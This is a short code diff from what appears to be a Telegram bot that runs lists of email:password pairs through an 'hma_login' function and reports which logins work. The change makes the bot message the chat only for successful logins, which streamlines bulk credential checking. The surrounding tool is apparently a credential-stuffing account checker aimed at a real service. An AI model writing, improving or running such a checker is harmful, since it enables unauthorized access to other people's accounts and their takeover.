@@ -62,12 +62,13 @@ async def trans(client, m: Message):
                 success, message = hma_login(email, password)
                 if success:
                     result_message = f"Good Login for {email} : {password}"
+                    await app.send_message(m.chat.id, result_message)
                 else:
                     result_message = f"Bad Login for {email}: {password} - {message}"
             else:
                 result_message = f"Invalid line format: {line}"
 
-            await app.send_message(m.chat.id, result_message)
+            
 
             # Update progress and send message if necessary
             if index + 1 >= next_progress_threshold:
